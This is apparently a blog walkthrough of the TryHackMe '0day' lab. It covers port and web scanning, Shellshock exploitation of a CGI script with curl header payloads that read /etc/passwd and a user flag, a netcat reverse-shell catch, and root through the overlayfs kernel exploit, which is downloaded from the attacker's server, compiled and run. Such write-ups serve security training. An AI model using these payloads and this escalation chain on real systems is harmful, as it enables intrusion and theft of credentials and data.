<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-175469707-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-175469707-1'); </script><title>Tryhackme - 0day | Rhovelionz</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Tryhackme - 0day" /><meta name="author" content="Rhovelionz" /><meta property="og:locale" content="en_US" /><meta name="description" content="Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only." /><meta property="og:description" content="Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only." /><link rel="canonical" href="http://localhost:4000/posts/0day/" /><meta property="og:url" content="http://localhost:4000/posts/0day/" /><meta property="og:site_name" content="Rhovelionz" /><meta property="og:image" content="http://localhost:4000/assets/img/Post/0day.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-27T07:20:00+07:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Post/0day.png" /><meta property="twitter:title" content="Tryhackme - 0day" /><meta name="twitter:site" content="@radivanh" /><meta name="twitter:creator" content="@Rhovelionz" /><meta name="google-site-verification" content="google-site-verification=eEOXNHtwQt24Bt3B-yrX7yp4uqtc0A-hWaVNSG5mL3E" /> <script type="application/ld+json"> {"url":"http://localhost:4000/posts/0day/","headline":"Tryhackme - 0day","dateModified":"2022-09-27T07:20:00+07:00","datePublished":"2022-09-27T07:20:00+07:00","author":{"@type":"Person","name":"Rhovelionz"},"description":"Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/0day/"},"image":"http://localhost:4000/assets/img/Post/0day.png","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="//assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="//assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="//assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="//assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="//assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="//assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="//assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="//assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="//assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="//assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="//assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="//assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="//assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="//assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="//assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="//assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="//assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="//assets/img/favicons/manifest.json"><meta name='msapplication-config' content='//assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="//assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="//" alt="avatar"> <img src="//assets/img/sample/anubis3b.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Rhovelionz</a></div><div class="site-subtitle font-italic">Publish Writeup and Pentesting Report</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="//" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/rhovelionz" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/radivanh" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['radivanhradivanh','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="//"> Posts </a> </span> <span>Tryhackme - 0day</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Tryhackme - 0day</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 27, 2022, 7:20 AM +0700" > Sep 27 <i class="unloaded">2022-09-27T07:20:00+07:00</i> </span> by <span class="author"> Rhovelionz </span></div></div><div class="post-content"> <img src="/assets/img/Post/0day.png"><blockquote><p><strong>Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.</strong></p></blockquote><h2 id="summary"><strong><span style="color:#ff5555">Summary</span></strong></h2><hr /><ul><li>Running Nikto to get foothold</li><li>Gives an error which shows that this page is vulnerable to ShellShock</li><li>Making Curl request toward the web server</li><li>One-liner reverse shell with Curl request</li><li>Uname -a gives overlayfs Local Privilege Escalation vulnerability</li><li>Download the exploit file to the machine, compile and execute</li></ul><h2 id="port-scan"><strong><span style="color:#ff5555">Port scan</span></strong></h2><hr /><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="go">➜  0day nmap -sCV -p- -T4 10.10.241.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 03:12 UTC
</span><span class="gp">Stats: 0:07:29 elapsed;</span><span class="w"> </span>0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Connect Scan
<span class="gp">Connect Scan Timing: About 31.72% done;</span><span class="w"> </span>ETC: 03:36 <span class="o">(</span>0:16:04 remaining<span class="o">)</span>
<span class="go">Warning: 10.10.241.3 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.241.3
Host is up (0.29s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
</span><span class="gp">22/tcp    open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp    open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
6681/tcp  filtered unknown
14692/tcp filtered unknown
15314/tcp filtered unknown
24059/tcp filtered unknown
35361/tcp filtered unknown
49775/tcp filtered unknown
61037/tcp filtered unknown
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1338.70 seconds
</span></pre></table></code></div></div><h2 id="website"><strong><span style="color:#ff5555">Website</span></strong></h2><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/thm/0day/website.png" alt="" /></p><p>There are 2 ports open.</p><ul><li>22 for SSH</li><li>80 for HTTP</li></ul><p>And it’s using Apache with version 2.4.7</p><h2 id="enumeration"><strong><span style="color:#ff5555">Enumeration</span></strong></h2><hr /><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="go">➜  0day gobuster dir --url http://10.10.241.3/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.3/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/28 03:13:27 Starting gobuster in directory enumeration mode
===============================================================
</span><span class="gp">/cgi-bin              (Status: 301) [Size: 311] [--&gt;</span><span class="w"> </span>http://10.10.241.3/cgi-bin/]
<span class="gp">/img                  (Status: 301) [Size: 307] [--&gt;</span><span class="w"> </span>http://10.10.241.3/img/]
<span class="gp">/uploads              (Status: 301) [Size: 311] [--&gt;</span><span class="w"> </span>http://10.10.241.3/uploads/]
<span class="gp">/admin                (Status: 301) [Size: 309] [--&gt;</span><span class="w"> </span>http://10.10.241.3/admin/]
<span class="gp">/css                  (Status: 301) [Size: 307] [--&gt;</span><span class="w"> </span>http://10.10.241.3/css/]
<span class="gp">/js                   (Status: 301) [Size: 306] [--&gt;</span><span class="w"> </span>http://10.10.241.3/js/]
<span class="gp">/backup               (Status: 301) [Size: 310] [--&gt;</span><span class="w"> </span>http://10.10.241.3/backup/]
<span class="gp">/secret               (Status: 301) [Size: 310] [--&gt;</span><span class="w"> </span>http://10.10.241.3/secret/]
<span class="go">Progress: 9767 / 220562 (4.43%)
</span></pre></table></code></div></div><p>Running gobuster doesn’t give anything useful while nikto gives pretty good result.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="go">➜  0day nikto -h http://10.10.241.3/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.241.3
+ Target Hostname:    10.10.241.3
+ Target Port:        80
+ Start Time:         2022-09-28 03:20:35 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ Uncommon header 'nikto-added-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
</span></pre></table></code></div></div><h2 id="foothold"><strong><span style="color:#ff5555">Foothold</span></strong></h2><hr /><p>The site appears to be vulnerable to the ‘Shellshock’ vulnerability. Attackers may be exploited Shellshock within hours of the initial disclosure by creating botnets of compromised computers to perform distributed denial-of-service attacks and vulnerability scanning. By trying curl the website, it shows the error that vulnerable to <code class="language-plaintext highlighter-rouge">shellshock</code>.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">➜  0day curl -H 'User-Agent: () { :;</span><span class="w"> </span><span class="o">}</span><span class="p">;</span> /bin/bash <span class="nt">-c</span> <span class="s2">"sleep3"</span><span class="s1">' http://10.10.241.3/cgi-bin/test.cgi
</span><span class="gp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span><span class="w">
</span><span class="gp">&lt;html&gt;</span><span class="s1">&lt;head&gt;
</span><span class="gp">&lt;title&gt;</span><span class="s1">500 Internal Server Error&lt;/title&gt;
</span><span class="gp">&lt;/head&gt;</span><span class="s1">&lt;body&gt;
</span><span class="gp">&lt;h1&gt;</span><span class="s1">Internal Server Error&lt;/h1&gt;
</span><span class="gp">&lt;p&gt;</span><span class="s1">The server encountered an internal error or
</span><span class="go">misconfiguration and was unable to complete
</span><span class="gp">your request.&lt;/p&gt;</span><span class="w">
</span><span class="gp">&lt;p&gt;</span>Please contact the server administrator at
<span class="go"> webmaster@localhost to inform them of the time this error occurred,
</span><span class="gp"> and the actions you performed just before this error.&lt;/p&gt;</span><span class="w">
</span><span class="gp">&lt;p&gt;</span>More information about this error may be available
<span class="gp">in the server error log.&lt;/p&gt;</span><span class="w">
</span><span class="gp">&lt;hr&gt;</span><span class="w">
</span><span class="gp">&lt;address&gt;</span>Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.241.3 Port 80&lt;/address&gt;
<span class="gp">&lt;/body&gt;</span>&lt;/html&gt;
<span class="go">➜  0day
</span></pre></table></code></div></div><p>Now let’s try to cat the passwd file</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">➜  0day curl -A "() { ignored;</span><span class="w"> </span><span class="o">}</span><span class="p">;</span> <span class="nb">echo </span>Content-Type:text/plain<span class="p">;</span><span class="nb">echo</span><span class="p">;</span><span class="nb">echo</span><span class="p">;</span>/bin/cat /etc/passwd<span class="s2">" http://10.10.241.3/cgi-bin/test.cgi
</span><span class="go">
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span></pre></table></code></div></div><p>And we may cat the <code class="language-plaintext highlighter-rouge">user.txt </code>with this vulnerability.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">➜  0day curl -A "() { ignored;</span><span class="w"> </span><span class="o">}</span><span class="p">;</span> <span class="nb">echo </span>Content-Type:text/plain<span class="p">;</span><span class="nb">echo</span><span class="p">;</span><span class="nb">echo</span><span class="p">;</span>/bin/cat /home/ryan/user.txt<span class="s2">" http://10.10.241.3/cgi-bin/test.cgi
</span><span class="go">
THM{Sh3llSh0ck_*****}
</span></pre></table></code></div></div><p>Seems like we might able to setup reverse shell against this box.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">➜  0day nc -lvnp 1337
Connection from 10.10.241.3:48350
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></pre></table></code></div></div><p>And we got shell as www-data, try running <code class="language-plaintext highlighter-rouge">sudo -l</code> with no result, but <code class="language-plaintext highlighter-rouge">uname -a</code> is exploitable using <code class="language-plaintext highlighter-rouge">"overlayfs Local Privilege Escalation"</code></p><h2 id="escalate-to-root"><strong><span style="color:#ff5555">Escalate to root</span></strong></h2><hr /><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">www-data@ubuntu:/usr/lib/cgi-bin$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-a</span>
<span class="go">uname -a
</span><span class="gp">Linux ubuntu 3.13.0-32-generic #</span>57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
<span class="gp">www-data@ubuntu:/usr/lib/cgi-bin$</span><span class="w">
</span></pre></table></code></div></div><p>Fire up Searchsploit to check if there is exploit for it.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">➜  0day searchsploit overlay
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Ubuntu / Fedora / RedHat) - 'Overlayfs' Local Privilege Escalation (Metasploit)                                                                              | linux/local/40688.rb
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                                       | linux/local/37292.c
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                                  | linux/local/37293.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)                                                                                       | linux/local/39166.c
Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2)                                                                                                            | linux/local/39230.c
OverlayFS inode Security Checks - 'inode.c' Local Security Bypass                                                                                                          | linux/local/36571.sh
Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation                                                                                            | linux/local/41762.txt
Ubuntu 15.10 - 'USERNS ' Overlayfs Over Fuse Privilege Escalation                                                                                                          | linux/local/41763.txt
Ubuntu 19.10 - ubuntu-aufs-modified mmap_region() Breaks Refcounting in overlayfs/shiftfs Error Path                                                                       | linux/dos/47692.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></pre></table></code></div></div><p>Send the exploit file to the machine and compile with <code class="language-plaintext highlighter-rouge">gcc</code></p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">➜  0day python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.241.3 - - [28/Sep/2022 03:55:34] "GET /37292.c HTTP/1.1" 200 -
10.10.241.3 - - [28/Sep/2022 03:55:53] "GET /37292.c HTTP/1.1" 200 -
</span></pre></table></code></div></div><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">www-data@ubuntu:/usr/lib/cgi-bin$</span><span class="w"> </span><span class="nb">cd</span> /tmp
<span class="go">cd /tmp
</span><span class="gp">www-data@ubuntu:/tmp$</span><span class="w"> </span>wget http://10.17.62.230:8000/37292.c
<span class="go">wget http://10.17.62.230:8000/37292.c
--2022-09-27 20:55:53--  http://10.17.62.230:8000/37292.c
Connecting to 10.17.62.230:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/plain]
Saving to: '37292.c'

</span><span class="gp">100%[======================================&gt;</span><span class="o">]</span> 4,968       <span class="nt">--</span>.-K/s   <span class="k">in </span>0.001s
<span class="go">
2022-09-27 20:55:54 (6.70 MB/s) - '37292.c' saved [4968/4968]

</span><span class="gp">www-data@ubuntu:/tmp$</span><span class="w">
</span></pre></table></code></div></div><p>The file can’t be compiled because of the PATH that being used in this version of Ubuntu is incorrect, so we need to fix the PATH to the default.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">www-data@ubuntu:/tmp$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin/:/sbin:/bin 
</pre></table></code></div></div><p>Compile the file with gcc and we can execute the file</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">www-data@ubuntu:/tmp$</span><span class="w"> </span>gcc 37292.c <span class="nt">-o</span> myexploit
<span class="go">gcc 37292.c -o myexploit
</span><span class="gp">www-data@ubuntu:/tmp$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">ls -la
total 40
drwxrwxrwt  4 root     root      4096 Sep 27 21:03 .
drwxr-xr-x 22 root     root      4096 Sep  2  2020 ..
drwxrwxrwt  2 root     root      4096 Sep 27 20:12 .ICE-unix
drwxrwxrwt  2 root     root      4096 Sep 27 20:12 .X11-unix
-rw-r--r--  1 www-data www-data  4968 Sep 27 20:54 37292.c
-rwxr-xr-x  1 www-data www-data 13652 Sep 27 21:03 myexploit
</span><span class="gp">www-data@ubuntu:/tmp$</span><span class="w">
</span></pre></table></code></div></div><p>Run the exploit and we get root directly</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">www-data@ubuntu:/tmp$</span><span class="w"> </span>./myexploit
<span class="go">./myexploit
spawning threads
</span><span class="gp">mount #</span>1
<span class="gp">mount #</span>2
<span class="go">child threads done
/etc/ld.so.preload created
creating shared library
</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</span><span class="gp">#</span><span class="w">
